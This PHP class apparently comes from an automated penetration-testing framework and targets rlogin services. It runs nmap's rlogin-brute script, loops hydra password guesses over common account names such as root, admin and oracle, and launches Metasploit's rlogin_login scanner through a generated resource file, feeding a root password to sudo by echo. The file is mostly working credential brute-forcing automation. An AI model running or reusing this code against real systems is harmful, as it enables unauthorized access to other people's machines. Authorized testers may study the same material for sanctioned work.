<?php


class service2rlogin extends SERVICE {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo);
    }


public function service2rlogin4exec(){
    $result = "";

        $result .= $this->ssTitre(__FUNCTION__);
        $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"rlogin-brute\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
        $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
        
        
        
        
        $users_test = array("mysql","oracle","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
        foreach ($users_test as $user_test){
            $result .= $this->port2auth4pass4hydra("rlogin",$user_test,"password");
            //$result .= $this->port2auth4dico4medusa("rlogin",$user_test);
            //$query = "patator rlogin_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
            //$result .= $this->cmd("localhost",$query);	    $result .= $this->req_ret_str($query);
        }
         
        
        $result .= $this->service2ssh();
        
        /*
        $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
        $conn = $this->mysql_ressource->query($sql_r);
        while ($row = $conn->fetch_assoc()){
            $user2name = trim($row['user2name']);
            $user2pass = trim($row['user2pass']);
            $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
            if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("rlogin", $user2name, $user2pass);
        }
        */
        
        return $result;
}




public function service2rlogin4msf(){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $query = "echo \"db_status\nuse auxiliary/scanner/rservices/rlogin_login\nset RHOSTS $this->ip\nset RPORT $this->port\nset THREADS 8\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$this->ip.$this->port.rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
    return $this->req_ret_str($query);
}




  }
?>
